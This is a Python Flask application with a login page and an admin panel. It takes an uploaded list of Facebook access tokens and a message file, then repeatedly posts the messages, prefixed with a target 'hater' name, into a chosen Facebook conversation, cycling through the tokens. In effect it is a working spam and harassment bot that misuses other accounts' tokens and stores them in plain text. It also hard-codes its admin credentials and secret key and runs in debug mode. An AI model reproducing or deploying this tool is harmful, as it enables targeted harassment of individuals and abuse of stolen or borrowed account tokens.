from flask import Flask, request, render_template_string, redirect, url_for, session, flash
import requests
import time
import os

# Flask application setup
app = Flask(__name__)  # Fix: Use double underscores
app.secret_key = 'your_secret_key_here'  # Change this to a random secret key for security

# Login credentials
ADMIN_USERNAME = "S9B9 JUTTI"
ADMIN_PASSWORD = "L3G3ND JUTTI"

# Headers for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'https://www.google.com'  # Added correct referer
}

# HTML Templates
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S9B9 JUTT - Login</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-image: url('https://i.ibb.co/41zsttw/IMG-20241115-WA0132.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            padding: 2rem;
            border-radius: 20px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            text-align: center;
            width: 300px;
        }
        h1 {
            color: #fff;
            margin-bottom: 1.5rem;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 0.75rem;
            margin-bottom: 1rem;
            border: none;
            border-radius: 50px;
            background-color: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 1rem;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1rem;
            transition: all 0.3s;
            width: 100%;
        }
        .flash-message {
            margin-bottom: 1rem;
            padding: 0.5rem;
            border-radius: 4px;
        }
        .flash-message.error {
            background-color: rgba(244, 67, 54, 0.1);
            border: 1px solid #f44336;
            color: #f44336;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>S9B9 JUTT</h1>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="flash-message {{ category }}">{{ message }}</div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        <form action="{{ url_for('login') }}" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="contact-admin">
            <a href="mailto:krishera61@gmail.com">Contact Admin</a>
        </div>
    </div>
</body>
</html>
'''

ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S9B9 JUTT - Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('https://i.ibb.co/HPXV2BV/IMG-20241115-WA0095.jpg');
            background-size: cover;
            margin: 0;
            padding: 20px;
            color: white;
        }
        .container {
            max-width: 700px;
            margin: 0 auto;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
        }
        h1, h2 {
            text-align: center;
        }
        input {
            margin-bottom: 10px;
            padding: 10px;
            border-radius: 5px;
            border: none;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .logout {
            text-align: right;
        }
        .flash-message.success {
            background-color: #dff0d8;
            border: 1px solid #3c763d;
            color: #3c763d;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>S9B9 JUTT</h1>
        <div class="logout">
            <a href="{{ url_for('logout') }}">Logout</a>
        </div>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="flash-message {{ category }}">{{ message }}</div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        <form action="{{ url_for('send_message') }}" method="post" enctype="multipart/form-data">
            <input type="text" name="threadId" placeholder="Convo_id" required>
            <input type="file" name="txtFile" accept=".txt" required>
            <input type="file" name="messagesFile" accept=".txt" required>
            <input type="text" name="kidx" placeholder="Enter Hater Name" required>
            <input type="number" name="time" value="60" required placeholder="Speed in Seconds">
            <button type="submit">Submit Your Details</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('admin_panel'))
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        session['username'] = username
        return redirect(url_for('admin_panel'))
    else:
        flash('Incorrect username or password. Please try again.', 'error')
        return redirect(url_for('index'))

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/admin')
def admin_panel():
    if 'username' not in session:
        return redirect(url_for('index'))
    return render_template_string(ADMIN_TEMPLATE)

@app.route('/send_message', methods=['POST'])
def send_message():
    if 'username' not in session:
        return redirect(url_for('index'))
    
    thread_id = request.form.get('threadId')
    mn = request.form.get('kidx')
    time_interval = int(request.form.get('time'))
    
    txt_file = request.files['txtFile']
    access_tokens = txt_file.read().decode().splitlines()
    
    messages_file = request.files['messagesFile']
    messages = messages_file.read().decode().splitlines()
    
    num_comments = len(messages)
    max_tokens = len(access_tokens)
    
    folder_name = f"Convo_{thread_id}"
    os.makedirs(folder_name, exist_ok=True)

    # File writing
    with open(os.path.join(folder_name, "CONVO.txt"), "w") as f:
        f.write(thread_id)

    with open(os.path.join(folder_name, "token.txt"), "w") as f:
        f.write("\n".join(access_tokens))

    with open(os.path.join(folder_name, "haters.txt"), "w") as f:
        f.write(mn)

    with open(os.path.join(folder_name, "time.txt"), "w") as f:
        f.write(str(time_interval))

    with open(os.path.join(folder_name, "message.txt"), "w") as f:
        f.write("\n".join(messages))

    with open(os.path.join(folder_name, "np.txt"), "w") as f:
        f.write("NP")

    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
    
    # Try sending messages
    try:
        for message_index in range(num_comments):
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = messages[message_index].strip()
            
            parameters = {'access_token': access_token, 'message': f'{mn} {message}'}
            response = requests.post(post_url, json=parameters, headers=headers)

            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
            if response.ok:
                print(f"[+] SEND SUCCESSFUL No. {message_index + 1} - Message: {mn} {message}")
            else:
                print(f"[x] Failed to send Comment No. {message_index + 1}. Response: {response.text}")

            time.sleep(time_interval)  # Sleep as specified by user
    except Exception as e:
        print(f"An error occurred: {e}")
    
    flash('Message sending process completed.', 'success')
    return redirect(url_for('admin_panel'))

if __name__ == '__main__':  # Fix: Use double underscores
    app.run(host='0.0.0.0', port=5000, debug=True)  # Set debug to False in production
